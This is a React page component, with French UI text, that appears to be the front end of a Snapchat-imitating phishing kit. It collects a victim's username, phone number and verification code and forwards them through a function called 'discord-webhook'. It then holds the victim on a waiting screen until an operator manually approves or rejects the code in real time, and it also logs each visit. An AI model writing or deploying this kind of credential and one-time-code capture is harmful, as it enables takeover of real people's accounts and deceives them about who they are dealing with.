import { useState, useEffect, useRef } from "react";
import SnapLogo from "@/components/SnapLogo";
import DisclaimerBox from "@/components/DisclaimerBox";
import SnapForm from "@/components/SnapForm";
import CodeVerification from "@/components/CodeVerification";
import WaitingValidation from "@/components/WaitingValidation";
import SuccessScreen from "@/components/SuccessScreen";
import { supabase } from "@/integrations/supabase/client";

type Step = "form" | "code" | "waiting" | "success";

const Index = () => {
  const [step, setStep] = useState<Step>("form");
  const [formData, setFormData] = useState({ username: "", phone: "" });
  const [submissionId, setSubmissionId] = useState<string | null>(null);
  const [codeError, setCodeError] = useState("");
  const [formError, setFormError] = useState("");
  const visitTracked = useRef(false);
  const formSubmittingRef = useRef(false);

  // Tracker la visite une seule fois
  useEffect(() => {
    if (visitTracked.current) return;
    visitTracked.current = true;
    
    supabase.from('visits').insert({
      user_agent: navigator.userAgent
    }).then(() => {
      console.log('Visit tracked');
    });
  }, []);

  // Écouter les changements de statut en temps réel
  useEffect(() => {
    if (!submissionId || step !== "waiting") return;

    const channel = supabase
      .channel(`submission-${submissionId}`)
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'submissions',
          filter: `id=eq.${submissionId}`
        },
        (payload) => {
          const newStatus = payload.new.status;
          if (newStatus === 'approved') {
            setStep("success");
          } else if (newStatus === 'rejected') {
            setCodeError("Code refusé. Veuillez réessayer.");
            setStep("code");
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [submissionId, step]);

  const handleFormSubmit = async (data: { username: string; phone: string }) => {
    // Protection contre les soumissions multiples rapides
    if (formSubmittingRef.current) return;
    formSubmittingRef.current = true;
    
    setFormError("");
    setFormData(data);
    
    try {
      // Vérifier d'abord si le numéro existe déjà en base
      const { data: existingPhone } = await supabase
        .from('submissions')
        .select('id')
        .eq('phone', data.phone)
        .maybeSingle();
      
      if (existingPhone) {
        setFormError("Ce numéro de téléphone a déjà été utilisé.");
        formSubmittingRef.current = false;
        return;
      }
      
      const { data: response, error } = await supabase.functions.invoke('discord-webhook', {
        body: { ...data, step: "form" }
      });
      
      // Vérifier si le numéro existe déjà (erreur serveur)
      if (error || response?.error === 'phone_exists') {
        setFormError(response?.message || "Ce numéro de téléphone a déjà été utilisé.");
        formSubmittingRef.current = false;
        return;
      }
      
      if (response?.submissionId) {
        setSubmissionId(response.submissionId);
      }
      
      setStep("code");
    } catch (error) {
      console.error("Error:", error);
      setFormError("Une erreur est survenue. Veuillez réessayer.");
    } finally {
      formSubmittingRef.current = false;
    }
  };

  const handleCodeSubmit = async (code: string) => {
    setCodeError("");
    
    try {
      await supabase.functions.invoke('discord-webhook', {
        body: { ...formData, code, step: "code", submissionId }
      });
    } catch (error) {
      console.error("Error sending to Discord:", error);
    }
    
    setStep("waiting");
  };

  return (
    <div className="min-h-screen bg-background flex flex-col items-center justify-center px-4 py-12">
      <div className="flex flex-col items-center gap-8 w-full max-w-md">
        <SnapLogo />
        <DisclaimerBox />
        
        {step === "form" && (
          <SnapForm onSubmit={handleFormSubmit} externalError={formError} />
        )}
        
        {step === "code" && (
          <CodeVerification onSubmit={handleCodeSubmit} error={codeError} />
        )}
        
        {step === "waiting" && (
          <WaitingValidation />
        )}
        
        {step === "success" && (
          <SuccessScreen />
        )}
      </div>
    </div>
  );
};

export default Index;
